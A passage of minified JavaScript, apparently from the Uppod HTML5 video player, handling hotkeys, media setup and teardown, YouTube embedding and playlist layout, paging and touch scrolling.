        media.volume + .1 < 1 ? media.volume += .1 : media.volume = 1),
        1 == vars.hotkey && 40 == e && media && (t.preventDefault(),
        0 < media.volume - .1 ? media.volume -= .1 : media.volume = 0),
        1 == vars.hotkey && 39 == e && media && 0 < Duration() && (i = line_all_b.w / Duration(),
        line_play_b.offsetWidth + i * vars.keyseek < line_all_b.w ? Seek(line_play_b.offsetWidth + i * vars.keyseek) : Seek(line_all_b.w)),
        1 == vars.hotkey && 37 == e && media && 0 < Duration() && (i = line_all_b.w / Duration(),
        0 < line_play_b.offsetWidth - i * vars.keyseek ? Seek(line_play_b.offsetWidth - i * vars.keyseek) : Seek(0)),
        1 == vars.hotkey && 68 == e && Mute(),
        1 == vars.hotkey && 70 == e && (ifull ? FullOff : Full)(),
        1 == vars.hotkey && 32 == e && (t.preventDefault(),
        Toggle()))
    }
    function DestroyMedia() {
        var t;
        media && (uppod.mediaW() && uppod.mediaW().destroy(),
        playInterval && (clearInterval(playInterval),
        media.removeEventListener("play", OnPlay, !1),
        media.removeEventListener("pause", OnPause, !1),
        media.removeEventListener("canplay", onCanPlay, !1),
        media.removeEventListener("volumechange", OnVolume, !1)),
        or = [],
        ori = 0,
        vars.hls_quality = !1,
        isYoutube() ? (media_yt.stopVideo(),
        delete media_yt,
        (t = document.getElementById("yt_media_" + vars.uid)).parentNode.removeChild(t),
        vars.youtube = !1,
        vars.youtube_quality_received = !1,
        !ifull && layer && Show(layer)) : (media.pause(),
        media.src = "",
        media_mc.removeChild(media)),
        delete media,
        media = void 0,
        vars.events = new Array,
        line_b && (CSS(line_play_b, {
            width: "0"
        }),
        CSS(line_load_b, {
            width: "0"
        })),
        iplay = init = igo = !1,
        startX = 0)
    }
    function Media() {
        var t;
        DestroyMedia(),
        vars.config.loader("gUgPZLPupR5FpKbOZnPBtKHmJEGrtKqmgLb7gQ1upR5FpKbOZnPFkUAEgUI1Tu4DJE50Z1d0TubhgEDednb9x2bukLHoWE5EgUimJRdbkL9stEGQpwWNZuTNkUA3VKbmgyPFty0Ns2IZJE50Z1d0TubhgEPPkC09V1AFUUG8JE50Z1d0TubhgEPPkU1rfCAupR5FpKbOZnPbkUAEgUI1Tu4DgvAbUU1px2q9goChJ3INZ24jkUAEgUI1Tu4oUvG3kEp9x2M9MU07p2PNZKqjJE0AkUANgnPrR2dpkUABfUShTuCBZKvFgyPhgUTDquCoIUPBkLpTUKXok2qjJElrW1GTJnTmW2TokyGrR2dpkU19TuC0pUWhXwi9kLT3kLHGkUmGfQDjULT2ULTNxeajMyG7ULTEULT6ULTeULTmULT1ULT6ULT5ULTmULpPULT6MLGTW2gTWejBtvBogCBoxFi9kQAntuMjMyl7My5ofRI9WEBGdEBGdEBozK1bgKbPU21FzKWPJ2AoTu91ZuIcZ2GOToG0TuvhT3iPTuChpwGcq1d8TK9eVUINZ258gKb2zKbuzKdEgRv0gqCmgR1bZoI8JRWeZ2G1pKC8ZKCupwGeJ3WhzKvBTKChgHdjVRGlzvIOg2pmgUG0Z3i8TuboVwI8Z25FZKbFVEThT3imVUajW3BokyBBtwA9kylk"),
        OwnVars(),
        (-1 < vars.file.indexOf("youtube.com/") || -1 < vars.file.indexOf("youtu.be/")) && (-1 < vars.file.indexOf("youtu.be/") ? (vars.youtube_id = vars.file.substr(vars.file.indexOf(".be/") + 4),
        vars.youtube_id.replace("/", "")) : vars.youtube_id = vars.file.split(/(youtu.be\/|v\/|embed\/|watch\?|youtube.com\/user\/[^#]*#([^\/]*?\/)*)\??v?=?([^#\&\?]*)/)[3],
        11 == vars.youtube_id.length && (vars.youtube = !0)),
        vars.hls_quality && 1 == vars.hlsautoquality && (vars.hd = "",
        vars.hda = vars.hd.split(","),
        vars.quality = null,
        HdSelect()),
        vars.youtube ? (isYoutubeApiLoaded() ? YoutubeInit() : (uppod.window.onYouTubeIframeAPIReady = function() {
            for (var t = 0; t < uppod_players.length; t++)
                uppod_players[t].isYoutube() && uppod_players[t].YoutubeInit()
        }
        ,
        (t = document.createElement("script")).src = "https://www.youtube.com/iframe_api",
        body.c.appendChild(t)),
        vars.youtube_created = !0) : (vars.youtube_created && hd_b && (vars.hd = "",
        vars.hda = vars.hd.split(","),
        vars.quality = null,
        HdSelect()),
        (media = uppod.createMediaW().dom).addEventListener("canplay", onCanPlay),
        media.addEventListener("play", OnPlay),
        media.addEventListener("pause", OnPause),
        media.setAttribute("onplay", OnPlay),
        uppod.mediaW().onEnded.bind(OnEnded),
        media_mc.appendChild(media),
        CSS(media_mc, {
            width: vars.sw - (ifull ? 0 : 2 * vars.padding) + "px"
        }),
        media.setAttribute("width", "100%"),
        media.setAttribute("height", (ifull ? vars.sh : vars.ph) - (ifull ? 0 : 2 * vars.padding) - (1 == vars.cntrlout ? vars.cntrloutheight : 0) + "px"),
        media.setAttribute("x-webkit-airplay", "allow"),
        media.setAttribute("webkit-playsinline", "1"),
        media.controls = !1,
        CSS(media, {
            position: "absolute",
            top: 0,
            left: 0
        }),
        "width" == vars.scale && CSS(media, {
            "object-fit": "cover"
        }),
        "stretch" == vars.scale && CSS(media, {
            "object-fit": "fill"
        }),
        "audio" == vars.m && CSS(media, {
            width: "0px",
            height: "0px"
        }),
        browser.isOpera && "firstframe" == vars.auto && (vars.auto = "none"),
        "none" == vars.auto || 1 == vars.radio ? 1 == vars.radio && 1 == vars.radiodropcache && vars.file && (0 < vars.file.indexOf("?") ? vars.file = vars.file + "&" + getRandomInt(1, 100) : vars.file = vars.file + "?" + getRandomInt(1, 100)) : "load" == vars.auto ? media.preload = "auto" : media.preload = "metadata",
        "none" != vars.auto && Source(),
        "play" == vars.auto && uppod.mediaW().play(),
        setTimeout(checkStart, 100)),
        "" != vars.screenposter && (vars.screenposter = CheckBase64(vars.screenposter),
        CSS(scrn, {
            width: vars.sw,
            height: vars.sh,
            background: 'url("' + vars.screenposter + '") no-repeat center center',
            "background-size": "cover"
        })),
        "" != vars.poster && (!function() {
            if ("audio" == vars.m)
                return 1;
            if (1 == vars.fillposter)
                return 1;
            if (vars.youtube) {
                if (0 == browser.restrictMediaPlay)
                    return 1
            } else if (0 == browser.hasMediaPosterShown)
                return 1
        }() ? (media && media.setAttribute("poster", vars.poster),
        ifull && playlist && Resize()) : (poster_mc || ((poster_mc = createElement("div")).className = "uppod-poster",
        scrn.appendChild(poster_mc)),
        vars.poster = CheckBase64(vars.poster),
        CSS(poster_mc, {
            position: "absolute",
            left: 0,
            top: 0,
            width: vars.sw,
            height: vars.ph - 2 * vars.padding - (1 == vars.cntrlout ? vars.cntrloutheight : 0),
            background: 'url("' + vars.poster + '") no-repeat center center',
            "background-size": "cover",
            pointerEvents: "none"
        }))),
        "video" == vars.m && (mobile || itouch) && media && (media.ontouchstart = ClickScreenMobile),
        layer || (Layer(),
        isYoutube() && Hide(layer))
    }
    function ClickScreenMobile() {
        var t, e;
        nativecontrols || (t = 1 == vars.cntrlhide && !vars.controls_active && 0 == vars.cntrlout,
        e = ifull && !vars.controls_active && 1 == vars.fullcntrlhide,
        (t || e) && (CntrlShow(),
        clearInterval(hideInterval),
        hideInterval = setInterval(CntrlHide, 3e3)))
    }
    function Layer() {
        layer && Remove("layer"),
        (layer = createElement("div")).setAttribute("id", "layer"),
        body.c.appendChild(layer),
        CSS(layer, {
            width: "100%",
            height: scrn.offsetHeight,
            position: "absolute",
            top: 0,
            left: 0,
            zIndex: 2
        }),
        layer.onclick = LayerClick,
        layer.style.zIndex = 2,
        alrt.style.zIndex = 3,
        nametip && (nametip.style.zIndex = 4),
        controls && (controls.style.zIndex = 5),
        logo && (logo.style.zIndex = 6)
    }
    function LayerClick() {
        "" != vars.redirect && 1 == vars.redirect_click ? window.open(vars.redirect, vars.redirecttarget) : "video" == vars.m && (Toggle(),
        nativecontrols && Remove("layer"))
    }
    function oRadius() {
        var t, e;
        0 < vars.o && (oo = createElement("div"),
        t = 1,
        (e = (o11 = document.createElement("canvas")).getContext("2d")).webkitBackingStorePixelRatio < 2 && (t = window.devicePixelRatio || 1),
        o11.height = vars.o * t,
        o11.width = vars.o * t,
        e.fillStyle = "#" + ReColor(vars.bgcolor),
        e.beginPath(),
        e.scale(t, t),
        e.moveTo(0, 0),
        e.lineTo(vars.o / 2, 0),
        e.quadraticCurveTo(0, 0, 0, vars.o / 2),
        e.closePath(),
        e.fill(),
        oo.appendChild(o11),
        e = (o12 = document.createElement("canvas")).getContext("2d"),
        o12.height = vars.o * t,
        o12.width = vars.o * t,
        e.fillStyle = "#" + ReColor(vars.bgcolor),
        e.beginPath(),
        e.scale(t, t),
        e.moveTo(0, 0),
        e.quadraticCurveTo(vars.o / 2, 0, vars.o / 2, vars.o / 2),
        e.lineTo(vars.o / 2, 0),
        e.closePath(),
        e.fill(),
        oo.appendChild(o12),
        e = (o22 = document.createElement("canvas")).getContext("2d"),
        o22.height = vars.o * t,
        o22.width = vars.o * t,
        e.fillStyle = "#" + ReColor(vars.bgcolor),
        e.beginPath(),
        e.scale(t, t),
        e.moveTo(vars.o / 2, 0),
        e.quadraticCurveTo(vars.o / 2, vars.o / 2, 0, vars.o / 2),
        e.lineTo(vars.o / 2, vars.o / 2),
        e.closePath(),
        e.fill(),
        oo.appendChild(o22),
        e = (o21 = document.createElement("canvas")).getContext("2d"),
        o21.height = vars.o * t,
        o21.width = vars.o * t,
        e.fillStyle = "#" + ReColor(vars.bgcolor),
        e.beginPath(),
        e.scale(t, t),
        e.moveTo(0, 0),
        e.quadraticCurveTo(0, vars.o / 2, vars.o / 2, vars.o / 2),
        e.lineTo(0, vars.o / 2),
        e.closePath(),
        e.fill(),
        oo.appendChild(o21),
        body.c.appendChild(oo),
        CSS(oo, {
            "z-index": 7,
            position: "absolute",
            top: 0,
            left: 0,
            "pointer-events": "none",
            height: "100%",
            overflow: "hidden",
            width: "100%"
        }),
        oo.style.zIndex = 7,
        oPos())
    }
    function oPos() {
        CSS(o11, {
            position: "absolute",
            top: 0,
            left: 0,
            width: vars.o + "px",
            height: vars.o + "px"
        }),
        CSS(o12, {
            position: "absolute",
            top: 0,
            left: Math.round(vars.sw - vars.o / 2),
            width: vars.o + "px",
            height: vars.o + "px"
        }),
        CSS(o22, {
            position: "absolute",
            top: Math.round(vars.sh - vars.o / 2),
            left: Math.round(vars.sw - vars.o / 2),
            width: vars.o + "px",
            height: vars.o + "px"
        }),
        CSS(o21, {
            position: "absolute",
            top: Math.round(vars.sh - vars.o / 2),
            left: 0,
            width: vars.o + "px",
            height: vars.o + "px"
        })
    }
    function ParseUrlHost(t) {
        var e = "";
        return -1 !== (t = t.replace(/(https?:\/\/)?(www.)?/i, "")).indexOf("/") && (e = t.split("/")[0]),
        e
    }
    function Source() {
        if ("" != vars.file)
            if (-1 < vars.file.indexOf(" or ")) {
                vars.or = vars.file.split(" or ");
                for (var t = 0; t < vars.or.length; t++)
                    -1 < vars.or[t].indexOf(" and ") && (e = vars.or[t].split(" and "),
                    vars.or[t] = e[getRandomInt(0, e.length - 1)]);
                if (vars.ori = 0,
                uppod_storage_support ? null != localStorage.getItem("pljcuidx") && (vars.ori = parseInt(localStorage.getItem("pljcuidx"))) : vars.ori = getCookie("pljcuidx") ? parseInt(getCookie("pljcuidx")) : 0,
                vars.file = vars.or[vars.ori],
                1 < vars.or.length && 0 == uppod_ping_hosts.length)
                    for (t = 0; t < vars.or.length; t++)
                        uppod_ping_hosts[t] = ParseUrlHost(vars.or[t])
            } else {
                var e;
                -1 < vars.file.indexOf(" and ") && (e = vars.file.split(" and "),
                vars.file = e[getRandomInt(0, e.length - 1)])
            }
        uppod.mediaW().setSources(vars.file)
    }
    function CreatePl() {
        (playlist = createElement("div")).className = "uppod-playlist",
        pl_mc = createElement("div"),
        playlist.appendChild(pl_mc),
        mobile || 1 != vars.hotkey || "video" != vars.m || playlist.addEventListener("dblclick", function(t) {
            t.stopPropagation()
        }),
        pl = new Array,
        plbg = new Array,
        pltext = new Array,
        plplayed = new Array,
        plrandom = new Array;
        var t = 0;
        for (i = 0; i < vars.pl.length; i++)
            pl[i] = createElement("div"),
            pl_mc.appendChild(pl[i]),
            CSS(pl[i], {
                cursor: "pointer",
                color: "#" + ReColor(vars.plcolor),
                width: vars.pltw,
                height: vars.plth
            }),
            1 == vars.plarrows && i > vars.pllimit - 1 && CSS(pl[i], {
                display: "none"
            }),
            "inside" != vars.plplace && "bottom" != vars.plplace || (CSS(pl[i], {
                position: "absolute",
                top: vars.plth * vars.pl_rows,
                left: vars.pltw * i + vars.plmargin * i - vars.pltw * t
            }),
            0 < vars.plrows && i % vars.plrows == 0 && (vars.pl[i].endrow = 1),
            1 == vars.pl[i].endrow && (vars.pl_rows++,
            t = i + 1)),
            "bottomrow" == vars.plplace && CSS(pl[i], {
                position: "absolute",
                top: vars.plth * i + vars.plmargin * i,
                left: 0,
                width: vars.sw - 2 * vars.plmargin
            }),
            pl_mc.appendChild(pl[i]),
            plbg[i] = createElement("div"),
            pl[i].appendChild(plbg[i]),
            CSS(plbg[i], {
                height: vars.plth,
                borderRadius: 0 < vars.o ? 4 : 0
            }),
            Opacity(plbg[i], vars.plalpha),
            CheckGradiendDiv(plbg[i], vars.plbgcolor),
            "inside" != vars.plplace && "bottom" != vars.plplace || CSS(plbg[i], {
                width: vars.pltw
            }),
            "botomrow" == vars.plplace && CSS(plbg[i], {
                width: vars.sw - 2 * vars.plmargin_h
            }),
            vars.pl[i].poster && 1 <= vars.pltumbs && (plbg[i].innerHTML = "<img src='" + vars.pl[i].poster + "' width='100%' id='plim" + i + "' class='uppod-playlist-" + i + "'>",
            Opacity(plbg[i], 1)),
            pltext[i] = createElement("div"),
            pl[i].appendChild(pltext[i]),
            CSS(pltext[i], {
                padding: 5,
                position: "absolute",
                top: 0,
                left: 0,
                fontFamily: vars.plfont,
                fontSize: vars.plfontsize,
                pointerEvents: "none"
            }),
            "botomrow" == vars.plplace && CSS(pltext[i], {
                height: vars.plth
            }),
            vars.pl[i].title ? pltext[i].innerHTML = vars.pl[i].title : Hide(pltext[i]),
            vars.pl[i].poster && 1 <= vars.pltumbs && (CheckGradiendDiv(pltext[i], vars.plbgcolor),
            CSS(plbg[i], {
                background: "none"
            }),
            1 == vars.pltumbs && 0 < i && Hide(pltext[i])),
            pl[i].className = "uppod-playlist-" + i,
            plbg[i].className = "uppod-playlist-" + i + "_background",
            pltext[i].className = "uppod-playlist-" + i + "_text",
            mobile || (pl[i].onmouseover = PlOver,
            pl[i].onmouseout = PlOut),
            pl[i].onclick = PlClick,
            plplayed[i] = !1,
            plrandom[i] = i;
        (mobile || itouch) && 0 == vars.plarrows && (pl_mc.ontouchstart = PlTouchStart,
        pl_mc.ontouchmove = PlTouchMove,
        pl_mc.ontouchend = PlTouchEnd),
        body.c.appendChild(playlist),
        "inside" != vars.plplace && "bottom" != vars.plplace || (CSS(playlist, {
            position: "absolute",
            width: vars.sw - 2 * vars.plmargin_h,
            height: vars.plth * (vars.pl_rows + 1) + 10,
            overflow: "hidden"
        }),
        "bottom" == vars.plplace ? CSS(pl_mc, {
            position: "absolute",
            top: 0,
            left: 0
        }) : CSS(pl_mc, {
            position: "absolute",
            top: 10,
            left: 0
        }),
        plwidth = (vars.pl.length - t) * vars.pltw + (vars.pl.length - t - 1) * vars.plmargin,
        plheight = vars.plth * (vars.pl_rows + 1) + 10),
        "bottomrow" == vars.plplace && (CSS(playlist, {
            position: "absolute",
            width: vars.sw - 2 * vars.plmargin_h,
            height: vars.bottomrowheight - vars.plmargin - 2 * vars.padding - 2 * vars.plmargin_v,
            overflow: "hidden"
        }),
        CSS(pl_mc, {
            position: "absolute",
            top: 0,
            left: 0
        }),
        plwidth = vars.sw - 2 * vars.plmargin_h,
        plheight = vars.pl.length * vars.plth + (vars.pl.length - 1) * vars.plmargin),
        1 == vars.plarrows && (plnext_b = new Element("bottomrow" == vars.plplace ? "download" : "next",20,20),
        body.c.appendChild(plnext_b.c),
        CSS(plnext_b.c, {
            cursor: "pointer"
        }),
        plnext_b.c.onclick = PlArrowNext,
        CSS((plprev_b = new Element("bottomrow" == vars.plplace ? "download" : "next",20,20)).c, {
            transform: "rotate(-180deg)",
            "-webkit-transform": "rotate(-180deg)",
            "-moz-transform": "rotate(-180deg)",
            "-o-transform": "rotate(-180deg)",
            "-ms-transform": "rotate(-180deg)"
        }),
        body.c.appendChild(plprev_b.c),
        CSS(plprev_b.c, {
            cursor: "pointer",
            display: "none"
        }),
        plprev_b.c.onclick = PlArrowPrev,
        plnext_b.c.style.zIndex = 6,
        plprev_b.c.style.zIndex = 6,
        PlArrows(),
        mobile || 1 != vars.hotkey || "video" != vars.m || (plnext_b.c.addEventListener("dblclick", function(t) {
            t.stopPropagation()
        }),
        plprev_b.c.addEventListener("dblclick", function(t) {
            t.stopPropagation()
        }))),
        ipl = 0,
        null != vars.plbgcolor_play && CSS(plbg[ipl], {
            "background-color": "#" + vars.plbgcolor_play
        }),
        null != vars.plcolor_play && CSS(pl[ipl], {
            color: "#" + vars.plcolor_play
        }),
        Opacity(plbg[ipl], vars.plalpha_play),
        playlist.style.zIndex = 6,
        PlPlace(),
        "inside" == vars.plplace && 0 == vars.pliview && (ShowHide(playlist),
        plnext_b && ("none" == playlist.style.display ? (Hide(plnext_b.c),
        Hide(plprev_b.c)) : (Show(plnext_b.c),
        Show(plprev_b.c))))
    }
    function Pl() {
        playlist ? "inside" == vars.plplace && (ShowHide(playlist),
        plnext_b && ("none" == playlist.style.display ? (Hide(plnext_b.c),
        Hide(plprev_b.c)) : (PlPlace(),
        Show(plnext_b.c),
        Show(plprev_b.c),
        PlArrows()))) : CreatePl()
    }
    function RemovePl() {
        playlist && (playlist.removeChild(pl_mc),
        body.c.removeChild(playlist),
        plnext_b && body.c.removeChild(plnext_b.c),
        plprev_b && body.c.removeChild(plprev_b.c))
    }
    function PlPlace() {
        "inside" == vars.plplace && (CSS(playlist, {
            width: vars.sw - 2 * vars.plmargin_h
        }),
        CSS(playlist, {
            top: (ifull ? vars.sh : vars.stageheight) - vars.plth - vars.cntrloutheight - 10 - vars.plth * vars.pl_rows,
            left: vars.plmargin_h
        }),
        plnext_b && (CSS(plprev_b.c, {
            position: "absolute",
            top: playlist.offsetTop + vars.plth / 2 + 20 * vars.cntrlsize / 2 + 10,
            left: playlist.offsetLeft - 10
        }),
        CSS(plnext_b.c, {
            position: "absolute",
            top: playlist.offsetTop + vars.plth / 2 - 20 * (vars.cntrlsize - 1) / 2,
            left: playlist.offsetLeft + playlist.offsetWidth + 10
        })),
        pl_mc.offsetLeft < -plwidth + playlist.offsetWidth && CSS(pl_mc, {
            position: "absolute",
            top: 10,
            left: -plwidth + playlist.offsetWidth
        }),
        plwidth <= vars.sw - 2 * vars.plmargin_h && CSS(pl_mc, {
            position: "absolute",
            top: 10,
            left: 0
        })),
        ifull || ("bottomrow" == vars.plplace && (CSS(playlist, {
            width: vars.sw - 2 * vars.plmargin_h
        }),
        CSS(playlist, {
            position: "absolute",
            top: vars.ph + (1 == vars.cntrlout ? vars.cntrloutheight : 0) + 10 + vars.plmargin_v,
            left: vars.plmargin_h
        }),
        plnext_b && (CSS(plprev_b.c, {
            position: "absolute",
            top: playlist.offsetTop - 5,
            left: playlist.offsetLeft + playlist.offsetWidth / 2 + 10
        }),
        CSS(plnext_b.c, {
            position: "absolute",
            top: playlist.offsetTop + playlist.offsetHeight + 5,
            left: playlist.offsetLeft + playlist.offsetWidth / 2 - 10
        })),
        null !== ipl && SlidePLs(ipl)),
        "bottom" == vars.plplace && (CSS(playlist, {
            width: vars.sw - 2 * vars.plmargin_h
        }),
        CSS(playlist, {
            position: "absolute",
            top: vars.ph + 10,
            left: vars.plmargin_h
        }),
        plnext_b && (CSS(plprev_b.c, {
            position: "absolute",
            top: playlist.offsetTop + vars.plth / 2 + 20 * vars.cntrlsize / 2,
            left: playlist.offsetLeft - 10
        }),
        CSS(plnext_b.c, {
            position: "absolute",
            top: playlist.offsetTop + vars.plth / 2 - 20 * vars.cntrlsize / 2,
            left: playlist.offsetLeft + playlist.offsetWidth + 10
        })),
        null !== ipl && SlidePLs(ipl)))
    }
    function PlTouchStart(t) {
        touchLastX = touchStartX = t.targetTouches[0].pageX,
        touchLastY = touchStartY = t.targetTouches[0].pageY
    }
    function PlTouchMove(t) {
        var e, i = t.targetTouches[0].pageX - touchLastX, o = t.targetTouches[0].pageY - touchLastY;
        touchLastX = t.targetTouches[0].pageX,
        touchLastY = t.targetTouches[0].pageY,
        "inside" != vars.plplace && "bottom" != vars.plplace || (e = pl_mc.offsetLeft + i) < 0 && e > -plwidth + playlist.offsetWidth && CSS(pl_mc, {
            position: "absolute",
            top: "bottom" == vars.plplace ? 0 : 10,
            left: e
        }),
        "bottomrow" == vars.plplace && (e = pl_mc.offsetTop + o) < 0 && e > -plheight + playlist.offsetHeight - 10 && CSS(pl_mc, {
            position: "absolute",
            top: e,
            left: 0
        }),
        t.preventDefault()
    }
    function PlTouchStart1(t) {
        ipltouch = getPlaylistId(t.target)
    }
    function PlTouchEnd(t) {
        var e = touchLastX - touchStartX
          , i = touchLastY - touchStartY;
        0 == e && 0 == i ? null != ipltouch && (PlClick0(),
        ipl = ipltouch,
        PlClickCont(),
        ipltouch = null) : PlTouchGo(e, i)
    }
    function getPlaylistId(t) {
        return t.className.replace("uppod-playlist-", "").split("_")[0]
    }
    function PlTouchGo(t, e) {
        var i;
        "inside" != vars.plplace && "bottom" != vars.plplace || (0 < (i = pl_mc.offsetLeft + t) && (i = 0),
        i < -plwidth + playlist.offsetWidth && (i = -plwidth + playlist.offsetWidth),
        clearInterval(plInterval),
        plaim = i,
        plInterval = setInterval(SlidePLProcess, 20)),
        "bottomrow" == vars.plplace && (0 < (i = pl_mc.offsetTop + e) && (i = 0),
        i < -plheight + playlist.offsetHeight - 10 && (i = -plheight + playlist.offsetHeight - 10),
        clearInterval(plInterval),
        plaim = i,
        plInterval = setInterval(SlidePLProcess, 20))
    }
    function PlOver(t) {
        t = getPlaylistId(t.target);
        Opacity(plbg[t], 1),
        SlidePLs(t),
        t && vars.pl[t].poster && vars.pl[t].title && Show(pltext[t])
    }
    function PlOut(t) {
        t = getPlaylistId(t.target);
        t && (vars.pl[t].poster && 1 <= vars.pltumbs ? ipl != t && (1 == vars.pltumbs && Hide(pltext[t]),
        Opacity(plbg[t], plplayed[t] ? .5 : 1)) : Opacity(plbg[t], ipl != t ? plplayed[t] ? vars.plalpha2 : vars.plalpha : vars.plalpha_play))
    }
    function PlClick(t) {
        null != ipl && PlClick0(),
        ipl = getPlaylistId(t.target),
        PlClickCont(),
        "" != vars.redirect && 1 == vars.redirect_clickpl && window.open(vars.redirect, vars.redirecttarget)
    }
    function PlClickCont() {
        vars.pl[ipl].folder ? PlClick1() : (PlClick1(),
        "inside" == vars.plplace && (Hide(playlist),
        plnext_b && Hide(plnext_b.c),
        plprev_b && Hide(plprev_b.c)),
        iplay || (istart = !0,
        Toggle())),
        CheckPrevNext()
    }
    function Next() {
        ipl < pl.length - 1 && PlNext()
    }
    function PlArrowNext() {
        var t = PlOnPage()
          , e = (plpage + 1) * t;
        if (e < pl.length) {
            plpage++;
            for (var i = e; i < e + vars.pllimit; i++)
                CSS(pl[i], {
                    display: "block"
                });
            "inside" != vars.plplace && "bottom" != vars.plplace || CSS(pl_mc, {
                position: "absolute",
                left: -pl[e].offsetLeft
            }),
            "bottomrow" == vars.plplace && CSS(pl_mc, {
                position: "absolute",
                top: -pl[e].offsetTop
            }),
            PlArrows()
        }
    }
    function PlOnPage() {
        if ("inside" != vars.plplace && "bottom" != vars.plplace)
            return Math.floor((vars.bottomrowheight - 2 * vars.plmargin_v) / vars.plth);
        var t = Math.floor((vars.sw - 2 * vars.plmargin_h) / vars.pltw);
        return t < vars.pllimit ? t : vars.pllimit
    }
    function PlArrows() {
        var t = PlOnPage()
          , e = plpage * t;
        (e + t >= pl.length ? Hide : Show)(plnext_b.c),
        (0 == e ? Hide : Show)(plprev_b.c),
        "inside" != vars.plplace && ifull && (Hide(plnext_b.c),
        Hide(plprev_b.c))
    }
    function PlArrowPrev() {
        var t = PlOnPage()
          , e = (plpage - 1) * t;
        if (0 <= e) {
            plpage--;
            for (var i = 0; i < pl.length; i++)
                CSS(pl[i], {
                    display: "none"
                });
            for (i = e; i < e + vars.pllimit; i++)
                CSS(pl[i], {
                    display: "block"
                });
            "inside" != vars.plplace && "bottom" != vars.plplace || CSS(pl_mc, {
                position: "absolute",
                left: -pl[e].offsetLeft
            }),
            "bottomrow" == vars.plplace && CSS(pl_mc, {
                position: "absolute",
                top: -pl[e].offsetTop
            }),
            PlArrows()
        }
    }
    function PlNext() {
        var t;
        1 == vars.random ? 1 < plrandom.length ? (null !== ipl && PlClick0(),
        ipl = plrandom[getRandomInt(0, plrandom.length - 1)],
        PlClick1(),
        Event("next")) : (EndPl(),
        prev_b && CSS(prev_b.c, {
            opacity: 1,
            filter: "alpha(opacity=100)",
            cursor: "pointer"
        })) : ipl < pl.length - 1 ? (null !== ipl && PlClick0(),
        t = 0,
        vars.pl[ipl].folder && !vars.pl[ipl].file && 0 == ipl ? t = 2 : ipl++,
        PlClick1(),
        vars.pl[ipl].folder && !vars.pl[ipl].file && 2 != t && (t = 1),
        0 < t && (PlClick0(),
        ClearOldVars(),
        ipl = t,
        UpdatedVarsFromPlaylist(vars.pl[ipl]),
        QualityLinks(),
        uppod.ads() && uppod.ads().newPlaylistItem(),
        NewFile(vars.file, !0),
        null != vars.plbgcolor_play && CSS(plbg[ipl], {
            "background-color": "#" + vars.plbgcolor_play
        }),
        null != vars.plcolor_play && CSS(pl[ipl], {
            color: "#" + vars.plcolor_play
        }),
        Opacity(plbg[ipl], vars.plalpha_play)),
        Event("next")) : EndPl(),
        CheckPrevNext(),
        iplay || OnPlay()
    }
    function CheckPrevNext() {
        0 == vars.random && (0 == ipl ? prev_b && CSS(prev_b.c, {
            opacity: .3,
            filter: "alpha(opacity=30)",
            cursor: "default"
        }) : prev_b && CSS(prev_b.c, {
            opacity: 1,
            filter: "alpha(opacity=100)",
            cursor: "pointer"
        }),
        ipl == pl.length - 1 ? next_b && CSS(next_b.c, {
            opacity: .3,
            filter: "alpha(opacity=30)",
            cursor: "default"
        }) : next_b && CSS(next_b.c, {
            opacity: 1,
            filter: "alpha(opacity=100)",
            cursor: "pointer"
        }))
    }
    function Prev() {
        PlPrev()
    }
    function PlPrev() {
        1 == vars.random ? 1 < plrandom.length ? (null !== ipl && PlClick0(),
        ipl = plrandom[getRandomInt(0, plrandom.length - 1)],
        PlClick1(),
        Event("prev")) : EndPl() : 0 < ipl && (null !== ipl && PlClick0(),
        ipl--,
        PlClick1(),
        Event("prev"),
        0 == ipl && prev_b && CSS(prev_b.c, {
            opacity: .3,
            filter: "alpha(opacity=30)",
            cursor: "default"
        })),
        CheckPrevNext()
    }
    function EndPl() {
        if (1 == vars.plplay1)
            TheEnd();
        else if (1 == vars.random) {
            for (p = 0; p < pl.length; p++)
                plrandom[p] = p;
            PlNext()
        } else
            PlClick0(),
            ipl = 0,
            PlClick1(),
            Event("next")
    }
    function PlClick0() {
        vars.pl[ipl].poster && 1 <= vars.pltumbs ? (1 == vars.pltumbs && Hide(pltext[ipl]),
        Opacity(plbg[ipl], .5)) : (null != vars.plbgcolor_play && CSS(plbg[ipl], {
            "background-color": "#" + vars.plbgcolor
        }),
        null != vars.plcolor_play && CSS(pl[ipl], {
            color: "#" + vars.plcolor
        }),
        Opacity(plbg[ipl], vars.plalpha2)),
        plplayed[ipl] = !0;
        var t = plrandom.indexOf(ipl);
        -1 != t && plrandom.splice(t, 1)
    }
    function PlClick1() {
        var t;
        vars.pl[ipl].folder ? ("back" != vars.pl[ipl].folder ? (vars.pl_history.push(vars.pl),
        t = vars.pl[ipl].folder,
        vars.pl = [{
            title: "←",
            folder: "back"
        }],
        vars.pl = vars.pl.concat(t),
        Event("plfolder")) : (vars.pl = vars.pl_history[vars.pl_history.length - 1],
        vars.pl_history.splice(vars.pl_history.length - 1, 1),
        Event("plback")),
        RemovePl(),
        CreatePl(),
        "inside" == vars.plplace && (Show(playlist),
        plnext_b && Show(plnext_b.c),
        plprev_b && Show(plprev_b.c)),
        plpage = 0) : (ClearOldVars(),
        UpdatedVarsFromPlaylist(vars.pl[ipl]),
        QualityLinks(),
        uppod.ads() && uppod.ads().newPlaylistItem(),
        NewFile(vars.file, !0),
        null != vars.plbgcolor_play && CSS(plbg[ipl], {
            "background-color": "#" + vars.plbgcolor_play
        }),
        null != vars.plcolor_play && CSS(pl[ipl], {
            color: "#" + vars.plcolor_play
        }),
        Opacity(plbg[ipl], vars.plalpha_play)),
        plnext_b && PlArrows()
    }
    function UpdatedVarsFromPlaylist(t) {
        for (var e in t)
            0 == t[e].indexOf("#") && (t[e] = un(t[e])),
            "poster" == e && null == vars.poster ? vars.poster = t.poster : vars[e] = t[e],
            "bigposter" == e && (vars.poster = t.bigposter)
    }
    function SlidePLs(t) {
        "inside" != vars.plplace && "bottom" != vars.plplace || plwidth > vars.sw - 2 * vars.plmargin_h && SlidePL(t),
        "bottomrow" == vars.plplace && plheight > vars.bottomrowheight && SlidePL(t)
    }
    function SlidePL(t) {
        var e;
        0 == vars.plarrows && (clearInterval(plInterval),
        "inside" != vars.plplace && "bottom" != vars.plplace || ((0 < (e = -pl[t].offsetLeft + playlist.offsetWidth / 2 - vars.pltw / 2) || plwidth < vars.sw) && (e = 10),
        e < 0 && e < -plwidth + playlist.offsetWidth - 10 && (e = -plwidth + playlist.offsetWidth - 10),
        plaim = e,
        plInterval = setInterval(SlidePLProcess, 20)),
        "bottomrow" == vars.plplace && (0 < (e = -pl[t].offsetTop + playlist.offsetHeight / 2 - vars.plth / 2) && (e = 10),
